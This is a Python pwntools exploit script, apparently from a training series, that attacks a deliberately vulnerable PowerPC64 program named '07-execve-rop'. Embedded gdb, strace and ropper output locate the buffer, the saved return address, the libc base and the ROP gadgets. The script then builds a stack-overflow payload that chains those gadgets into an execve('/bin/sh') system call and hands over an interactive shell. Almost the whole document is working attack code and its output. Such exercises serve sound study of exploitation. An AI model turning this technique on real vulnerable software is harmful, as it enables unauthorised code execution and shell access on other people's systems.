#!/usr/bin/python

"""
(gdb) disassemble vulnerable 
Dump of assembler code for function vulnerable:
   0x0000000010000734 <+0>:	mflr    r0
   0x0000000010000738 <+4>:	std     r0,16(r1)
...
   0x0000000010000794 <+96>:	ld      r0,16(r1)
   0x0000000010000798 <+100>:	mtlr    r0
   0x000000001000079c <+104>:	ld      r31,-8(r1)
   0x00000000100007a0 <+108>:	blr
   0x00000000100007a4 <+112>:	.long 0x0
   0x00000000100007a8 <+116>:	.long 0x1
   0x00000000100007ac <+120>:	lwz     r0,1(r1)
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x10000748: file src/07-execve-rop.c, line 6.
(gdb) b *0x0000000010000794
Breakpoint 2 at 0x10000794: file src/07-execve-rop.c, line 11.
(gdb) b *0x00000000100007a0
Breakpoint 3 at 0x100007a0: file src/07-execve-rop.c, line 11.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/07-execve-rop.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ff980 ""
(gdb) c
Continuing.

Breakpoint 2, 0x0000000010000794 in vulnerable () at src/07-execve-rop.c:11
11	}
(gdb) p/x $r1+16
$2 = 0x40007ffa20
(gdb) c
Continuing.

Breakpoint 3, 0x00000000100007a0 in vulnerable () at src/07-execve-rop.c:11
11	}
(gdb) i r $r1
r1             0x40007ffa10	274886294032
(gdb) maintenance print msymbols
...
[2445] D 0x4000aa5e70 system section .opd
...
(gdb) x/3gx 0x4000aa5e70
0x4000aa5e70 <system>:	0x00000040008f7ba0	0x0000004000abc300
0x4000aa5e80 <system+16>:	0x0000000000000000
"""

"""
$ qemu-ppc64 -L /usr/powerpc64-linux-gnu/ -strace ./bin/ppc64/07-execve-rop
...
19379 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
19379 mmap(NULL,2381768,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x0000004000875000
...
"""

"""
$ ropper --nocolor --arch PPC64 --inst-count 9 --file /usr/powerpc64-linux-gnu/lib/libc-2.27.so
0x001dd380: ld r0, 0x90(r1); li r5, 0; mtlr r0; addi r1, r1, 0x80; mr r3, r5; ld r31, -8(r1); blr;
0x0017e2e8: ld r0, 0xa0(r1); ld r4, 0x78(r1); mtlr r0; addi r1, r1, 0x90; ld r3, 8(r31); std r4, 8(r31); ld r31, -8(r1); blr;
0x000ae6a0: ld r0, 0x80(r1); ld r3, 0xa8(r1); mtlr r0; addi r1, r1, 0x70; blr;
0x00122230: li r0, 0xb; sc;
"""

import struct
import sys

from pwn import *

context(arch='powerpc64', os='linux', endian='big', word_size=64)

binary_path = './bin/ppc64/07-execve-rop'
libc_path = '/usr/powerpc64-linux-gnu/lib/libc-2.27.so'

saved_pc_addr = 0x40007ffa20
buffer_addr = 0x40007ff980
libc_addr = 0x0000004000875000

li_r5_0_ld_r31_addr = libc_addr + 0x001dd380
ld_r4_addr = libc_addr + 0x0017e2e8
ld_r3_addr = libc_addr + 0x000ae6a0
li_r0_0xb_sc_addr = libc_addr + 0x00122230

libc = ELF(libc_path)
bin_sh_addr = libc_addr + libc.search('/bin/sh\x00').next()

binary = ELF(binary_path)
binary_data_addr = binary.get_section_by_name('.data').header.sh_addr

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (saved_pc_addr - buffer_addr)
payload += p64(li_r5_0_ld_r31_addr)
# <- $r1 + 24
payload += 'b' * (0x80 - 8 - 24)
payload += p64(binary_data_addr) # r31
payload += 'c' * (0x90 - (0x80 - 8) - 8)
payload += p64(ld_r4_addr) # r0
# <- $r1 + 24
payload += 'd' * (0x78 - 24)
payload += p64(0) # r4
payload += 'e' * (0xa0 - 0x78 - 8)
payload += p64(ld_r3_addr)
# <- $r1 + 24
payload += 'f' * (0x80 - 24)
payload += p64(li_r0_0xb_sc_addr)
payload += 'g' * (0xa8 - 0x80 - 8)
payload += p64(bin_sh_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
